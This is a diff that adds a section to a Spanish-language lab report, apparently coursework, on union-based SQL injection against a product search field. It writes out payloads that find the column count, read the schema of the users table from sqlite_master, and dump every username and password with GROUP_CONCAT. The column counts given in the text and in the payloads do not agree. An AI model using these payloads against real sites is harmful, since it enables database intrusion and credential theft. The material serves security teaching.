@@ -58,7 +58,38 @@ lo que hace es comentar el bloque de sql haciendo un true en la validacion con l
 
 ### 2.2 Union-Based Injection
 
+#### 1. Detectar numero de columnas
+##### Buscar producto
+```sql
+' ORDER BY 1 --
+```
+Nos muestra el numro de colmunas que tiene la tabla en el formato de busqueda, por lo que podemos inferir que tienen 6 colmunas la tabla ya que eso es lo que nos muestra la hacer la consulta.
+
+![alt text](image-3.png)
+#### 2. Mostrar estructura de la tabla users
+Cuando realizamos la siguinete consulta dentro del input nos deberia de mostrar la estructura de la tabla de users, pero nos esta devolviendo solamente el nombre de la tabla
+
+```sql
+' UNION SELECT 1,sql,2,3 FROM sqlite_master WHERE name='users' --
+```
+![alt text](image-4.png)
+#### Consulta de datos 
+Podemos identificar que al momento de poner las siguientes lineas de codigo dentro del input, nos esta devolviendo un query con toda la información de datos que se encuentran dentro de los usuarios
+```sql
+' UNION SELECT 1,GROUP_CONCAT(username||':'||password),3,4 FROM users --
+```
+![alt text](image-5.png)
+esto es bastante importante a la hora de poder entrar a diferentes perfiles de los usuarios y adquirir informacion de la misma
+
+#### Numero total de usuarios
+```sql
+' UNION SELECT COUNT(*),2,3,4 FROM users --
+```
+Ientificamos en el item 5 el resultado de la consulta
+![alt text](image-6.png)
+
 ### 2.3 Blind SQL Injection
+
 ## 3. Técnicas de Explotación y Evidencias
 [Screenshots y código de payloads utilizados]
 ## 4. Análisis de Impacto y Contramedidas
